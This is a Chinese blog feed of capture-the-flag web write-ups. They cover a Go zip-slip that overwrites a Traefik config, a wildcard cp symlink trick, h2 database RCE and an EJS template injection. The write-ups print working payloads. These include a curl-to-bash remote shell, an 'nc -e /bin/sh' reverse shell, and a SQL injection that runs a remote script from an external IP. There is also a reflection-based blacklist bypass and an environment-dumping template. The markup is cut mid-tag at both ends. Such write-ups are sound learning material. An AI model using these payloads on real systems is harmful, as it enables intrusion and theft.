class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">unzipFile</span><span class="hljs-params">(zipPath, destDir <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>zipReader, err := zip.OpenReader(zipPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> zipReader.Close()<br><br><span class="hljs-keyword">for</span> _, file := <span class="hljs-keyword">range</span> zipReader.File &#123;<br>filePath := filepath.Join(destDir, file.Name)<br><span class="hljs-keyword">if</span> file.FileInfo().IsDir() &#123;<br><span class="hljs-keyword">if</span> err := os.MkdirAll(filePath, file.Mode()); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>err = unzipSimpleFile(file, filePath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">randFileName</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> uuid.New().String()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/*&quot;</span>)<br><br>r.GET(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>xForwardedFor := c.GetHeader(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>)<br><br><span class="hljs-keyword">if</span> !strings.Contains(xForwardedFor, <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;only localhost can get flag&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>flag := os.Getenv(<span class="hljs-string">&quot;FLAG&quot;</span>)<br><span class="hljs-keyword">if</span> flag == <span class="hljs-string">&quot;&quot;</span> &#123;<br>flag = <span class="hljs-string">&quot;flag&#123;testflag&#125;&quot;</span><br>&#125;<br><br>c.String(http.StatusOK, flag)<br>&#125;)<br><br>r.GET(<span class="hljs-string">&quot;/public/index&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>c.HTML(http.StatusOK, <span class="hljs-string">&quot;index.html&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;)<br><br>r.POST(<span class="hljs-string">&quot;/public/upload&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>file, err := c.FormFile(<span class="hljs-string">&quot;file&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;File upload failed&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>randomFolder := randFileName()<br>destDir := filepath.Join(uploadDir, randomFolder)<br><br><span class="hljs-keyword">if</span> err := os.MkdirAll(destDir, <span class="hljs-number">0755</span>); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to create directory&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>zipFilePath := filepath.Join(uploadDir, randomFolder+<span class="hljs-string">&quot;.zip&quot;</span>)<br><span class="hljs-keyword">if</span> err := c.SaveUploadedFile(file, zipFilePath); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to save uploaded file&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> err := unzipFile(zipFilePath, destDir); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error unzipping file:&quot;</span>, err)<br>c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to unzip file&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br><span class="hljs-string">&quot;message&quot;</span>: fmt.Sprintf(<span class="hljs-string">&quot;File uploaded and extracted successfully to %s&quot;</span>, destDir),<br>&#125;)<br>&#125;)<br><br>r.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>看源码好像还是挺简单的吧，只要<code>xff</code>访问<code>/flag</code>就行，但是看配置文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Dynamic configuration</span><br><br><span class="hljs-attr">http:</span><br>  <span class="hljs-attr">services:</span><br>    <span class="hljs-attr">proxy:</span><br>      <span class="hljs-attr">loadBalancer:</span><br>        <span class="hljs-attr">servers:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br>  <span class="hljs-attr">routers:</span><br>    <span class="hljs-attr">index:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/index`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>    <span class="hljs-attr">upload:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/upload`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br></code></pre></td></tr></table></figure><p>使用了反向代理只要访问<code>/public/index</code>和<code>/public/upload</code>的流量才会传给服务器这也是为什么打开容器就是404的原因</p><p>我们再来分析源码，看见只让上传压缩包，还会解压，验证方式也是使用的<code>archive/zip模块</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209210831989.png" alt="image-20250209210831989"></p><p>那我们可以尝试zip解压导致<strong>任意文件覆盖</strong></p><p>我们看下他的目录结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">/                                      <span class="hljs-comment"># 根目录</span><br>├── /traefik                           <span class="hljs-comment"># Traefik 二进制文件</span><br>├── /src                                <span class="hljs-comment"># 项目的源代码目录(删到了)</span><br>├── /app                                <span class="hljs-comment"># 应用目录，包含构建后的二进制文件和配置文件</span><br>│   ├── /main                          <span class="hljs-comment"># 生成的 Go 二进制文件</span><br>│   ├── /uploads                       <span class="hljs-comment"># 上传的文件存储目录</span><br>│   ├── /templates                     <span class="hljs-comment"># 应用模板目录</span><br>│   └── /.config                        <span class="hljs-comment"># 配置文件目录</span><br>│       ├── /dynamic.yml               <span class="hljs-comment"># 动态配置文件</span><br>│       └── /traefik.yml               <span class="hljs-comment"># Traefik 配置文件</span><br>├── /run.sh                             <span class="hljs-comment"># 启动脚本</span><br></code></pre></td></tr></table></figure><p>还发现每次访问都会加载<code>templates/index.html</code>那么我们就可以覆盖他写一个xss拿到flag对不对</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, &#123; <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &#125; &#125;)<br><br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>())<br><br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123; <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = data; &#125;);<br><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>如果你也这么想，那你就错了，错在哪</p><ol><li></li></ol><blockquote><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> adduser -D -h /dev/null ctf &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mkdir</span> /app/uploads &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chown</span> ctf:ctf -R /app/.config /app/uploads </span><br></code></pre></td></tr></table></figure><p>看dockerfile可以发现我们对<code>templates</code>文件夹并没有权限，无法进行写入，（在本地测了好久都可以，但是上传平台不成功)</p></blockquote><ol start="2"><li></li></ol><blockquote><p>使用的是反向代理，xss脚本的header就无效了</p></blockquote><p>所有我们得覆盖配置文件，覆盖这个动态配置文件</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209212939429.png" alt="image-20250209212939429"></p><p>首先我们准备好配置文件脚本</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">http:</span><br>  <span class="hljs-attr">middlewares:</span><br>    <span class="hljs-attr">forwardedHeaders:</span><br>      <span class="hljs-attr">headers:</span><br>        <span class="hljs-attr">customRequestHeaders:</span><br>          <span class="hljs-attr">X-Forwarded-For:</span> <span class="hljs-string">&quot;&#123;127.0.0.1&#125;&quot;</span><br><br>  <span class="hljs-attr">services:</span><br>    <span class="hljs-attr">proxy:</span><br>      <span class="hljs-attr">loadBalancer:</span><br>        <span class="hljs-attr">servers:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br><br>  <span class="hljs-attr">routers:</span><br>    <span class="hljs-attr">index:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/index`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br>    <span class="hljs-attr">upload:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/upload`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br>    <span class="hljs-attr">flag:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/flag`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br></code></pre></td></tr></table></figure><p>命名为<code>..1..1.config1dynamic.yml</code>(文件名不能有<code>/</code>暂时用<code>1</code>代替)</p><p>将他压缩，拿到notepad++（winhex也行）打开</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209213519539.png" alt="image-20250209213519539"></p><p>把<code>1</code>换成<code>/</code>，有两处都要换上</p><p>上传平台，在访问&#x2F;flag就可以</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209213900279.png" alt="image-20250209213900279"></p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>这个题目，呜呜呜，刚进去完全不知道要干嘛，第一次看源码也没翻到最下面，浅浅的翻了一下，第二天再看的时候才再最下面找到</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d7d936edd931ff0b32322c3228fe769a.png" alt="d7d936edd931ff0b32322c3228fe769a"></p><p>我们直接再上传<code>?_[2025.happy.new.year=curl http;//ip:port/1.sh|bash</code>成功拿到shell</p><p>查看根目录发现有flag，但是权限不够</p><p>尝试suid提权但是没有</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d720cfebd70d29e1289e1429f571c8cd.png" alt="d720cfebd70d29e1289e1429f571c8cd"></p><p>看一下<code>ps -ef</code>看看执行了什么</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210235408861.png" alt="image-20250210235408861"></p><p>发先执行了<code>/start.sh</code>和<code>backup.sh</code></p><p>start没有权限看不了，那就看backup</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-keyword">while</span> :<br><span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">cp</span> -P * /var/www/html/backup/<br>    <span class="hljs-built_in">chmod</span> 755 -R /var/www/html/backup/<br>    <span class="hljs-built_in">sleep</span> 15s<br><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>发现他会一直执行，刚开始的思路是环境变量劫持sleep函数让他执行<code>cat /flag &gt; /var/www/html/backup/1</code></p><p>再<code>export PATH=/tmp:$PATH</code>再创建一个<code>/tmp/sleep</code>为<code>cat /flag &gt; /var/www/html/backup/1</code>给权限</p><p>我自己尝试会执行<code>/tem/sleep</code>但由于没有权限就是空文件，但是backp.sh不会执行这个文件，不知道为什么</p><p>后来发现<code>backup.sh</code>使用了通配符<code>*</code>那我们是不是可以再文件名上下手</p><p>刚刚好cp有一个参数<code>-H</code>可以让软链接也被复制</p><p>那么就可以实现</p><p>payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;-H&quot;</span>  不是常规文件名不可以用<span class="hljs-built_in">touch</span><br><span class="hljs-built_in">ln</span> -s /flag 1<br></code></pre></td></tr></table></figure><p>然后等一会发现<code>/backup</code>文件夹中有1</p><p>再读取1拿到flag</p><h2 id="EasyDB"><a href="#EasyDB" class="headerlink" title="EasyDB"></a>EasyDB</h2><p>真的easy吗，呜呜呜，源码分析得到数据库是<code>h2</code>数据库，有一个账号</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> admin<br><span class="hljs-symbol">passwd:</span>admin<br></code></pre></td></tr></table></figure><p>但是没什么用，而且flag要通过&#x2F;readflag读取，单纯sql是拿不到高shell的，所以我们要另寻他法</p><p>上网查到h2数据库可以执行java代码，那么是不是可以利用这一点来实现任意命令执行能</p><p>网上下载了h2数据库本地部署</p><p>写一个Java函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">DROP ALIAS IF EXISTS exec_cmd; CREATE ALIAS exec_cmd AS <span class="hljs-string">&#x27;String rce() throws java.io.IOException &#123;</span><br><span class="hljs-string">    java.util.Scanner cmd_output = new java.util.Scanner(Runtime.getRuntime().exec(&quot;ls&quot;).getInputStream()).useDelimiter(&quot;\\\\A&quot;);</span><br><span class="hljs-string">    return cmd_output.hasNext() ? cmd_output.next() : &quot;&quot;;</span><br><span class="hljs-string">&#125;&#x27;</span>; CALL <span class="hljs-title function_">exec_cmd</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><p>发现确实可以执行命令</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210224050126.png" alt="image-20250210224050126"></p><p>但是存在黑名单</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>  blackLists.add(<span class="hljs-string">&quot;runtime&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;process&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;exec&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;shell&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;file&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;script&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;groovy&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过Java的反射机制改写一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">DROP ALIAS IF EXISTS RCE;<br>CREATE ALIAS RCE AS $$ <br>String <span class="hljs-title function_">rce</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123; <br>  <span class="hljs-type">byte</span>[] classNameBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;; <br>  <span class="hljs-type">byte</span>[] methodNameBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;; <br>  <span class="hljs-type">byte</span>[] methodName2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">101</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>&#125;; <br>  <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;./readflag&quot;</span>; <br>  Class&lt;?&gt; clazz = java.lang.Class.forName(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(classNameBytes)); <br>  java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">method1</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(methodNameBytes)); <br>  java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(methodName2), String.class); <br>  method2.invoke(method1.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;payload&#125;); <br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Exploited&quot;</span>; <br>&#125; $$;CALL <span class="hljs-title function_">RCE</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><p>本地测试可以执行命令，但是上传之后</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/c7896c977a222bee80520fb8f7e7cb58.png" alt="c7896c977a222bee80520fb8f7e7cb58"></p><p>只是这样没有回显，后面试了好久是，要不就是500</p><p>又去网上找了下找到<a href="https://www.cnblogs.com/F12-blog/p/18144377">这篇文章</a></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210233304791.png" alt="image-20250210233304791"></p><p>上传恶意sql文件，再控制jdbc url指向他</p><p>那就不要过滤了，直接写java</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS RCE <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;String rce(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return &quot;1&quot;;&#125;&#x27;</span>;<span class="hljs-keyword">CALL</span> RCE (<span class="hljs-string">&#x27;nc ip 32771 -e /bin/sh&#x27;</span>)<br></code></pre></td></tr></table></figure><p>使用<code>python3 -m http.server port</code>开启服务</p><p>sql什么也没过滤直接写</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27; union select 1,&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">3</span><span class="hljs-string">&#x27; from link_schema(&#x27;</span>TEST2<span class="hljs-string">&#x27;, &#x27;&#x27;, concat(&#x27;</span>jdbc:h2:mem:testdb1;TRACE_LEVEL_SYSTEM_OUT<span class="hljs-operator">=</span><span class="hljs-number">3</span>;<span class="hljs-keyword">IN</span><span class="hljs-string">&#x27;,&#x27;</span>IT<span class="hljs-operator">=</span>RUNSC<span class="hljs-string">&#x27;,&#x27;</span>RIPT <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;&#x27;</span>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">8.138</span><span class="hljs-number">.181</span><span class="hljs-number">.58</span>:<span class="hljs-number">32771</span><span class="hljs-operator">/</span><span class="hljs-number">1.</span><span class="hljs-keyword">sql</span><span class="hljs-string">&#x27;&#x27;&#x27;), &#x27;</span>sa<span class="hljs-string">&#x27;, &#x27;</span>sa<span class="hljs-string">&#x27;, &#x27;</span>PUBLIC<span class="hljs-string">&#x27;);--</span><br></code></pre></td></tr></table></figure><p>登录拿到shell</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210234642888.png" alt="image-20250210234642888"></p><p><code>./readflag</code>拿到flag</p><h1 id="display"><a href="#display" class="headerlink" title="display"></a>display</h1><p>一道xss但是CSP限制只能加载同源脚本，对于前端不是很了解，分析不是很透彻</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> csp = <span class="hljs-string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; base-uri &#x27;none&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
      <tag>xss</tag>
      
      <tag>zip上传</tag>
      
      <tag>linux越权</tag>
      
      <tag>CVE-2024-2961</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hgameweek1</title>
    <link href="/tuyi/2025/02/07/hgameweek1/"/>
    <url>/tuyi/2025/02/07/hgameweek1/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Pacman"><a href="#Pacman" class="headerlink" title="Pacman"></a><strong>Pacman</strong></h2><p>一个是一道js逆向吧，没怎么写明白，控制调试后修改分数大于10000然后挂了就行，</p><p>但其实flag就在代码里面，虽然混淆的很厉害但是代码利用3个base4，一个个是就出来了</p><h2 id="BandBomb"><a href="#BandBomb" class="headerlink" title="BandBomb"></a><strong>BandBomb</strong></h2><p>刚开始看到主界面的全回显以为有xss，测了很久发现没有</p><p>发现每次访问根路由都要加载模板文件，而且在rename路由又有任意文件覆盖那就考虑覆盖模板文件mortis.ejs</p><p>首先上传一个ejs文件，payload.ejs </p><p>文件内容：&lt;%&#x3D; (Function(‘return process.mainModule.require’)())(‘child_process’).execSync(‘cat &#x2F;proc&#x2F;self&#x2F;environ’).toString() %&gt;</p><p>然后访问rename路由发送</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;oldName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;payload.ejs&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;newName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;../views/mortis.ejs&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>访问主页就能拿到flag</p><h2 id="MysteryMessageBoard"><a href="#MysteryMessageBoard" class="headerlink" title="MysteryMessageBoard"></a><strong>MysteryMessageBoard</strong></h2><p>首先进来弱口令爆破得到密码888888</p><p>给了源码</p><p>有个flag路由，但是需要admin访问才可以</p><p>访问admin路由会触发在后台触发一个无头浏览器，登录admin账号而且访问index界面</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//无头浏览器模拟登录admin，并以admin身份访问/路由</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>lock.Lock()<br><span class="hljs-keyword">defer</span> lock.Unlock()<br>ctx, cancel := chromedp.NewContext(context.Background())<br><span class="hljs-keyword">defer</span> cancel()<br>ctx, _ = context.WithTimeout(ctx, <span class="hljs-number">20</span>*time.Second)<br><span class="hljs-keyword">if</span> err := chromedp.Run(ctx, myTasks()); err != <span class="hljs-literal">nil</span> &#123;<br>log.Println(<span class="hljs-string">&quot;Chromedp error:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;()<br>&#125;<br><br><span class="hljs-comment">// 无头浏览器操作</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myTasks</span><span class="hljs-params">()</span></span> chromedp.Tasks &#123;<br><span class="hljs-keyword">return</span> chromedp.Tasks&#123;<br>chromedp.Navigate(<span class="hljs-string">&quot;/login&quot;</span>),<br>chromedp.WaitVisible(<span 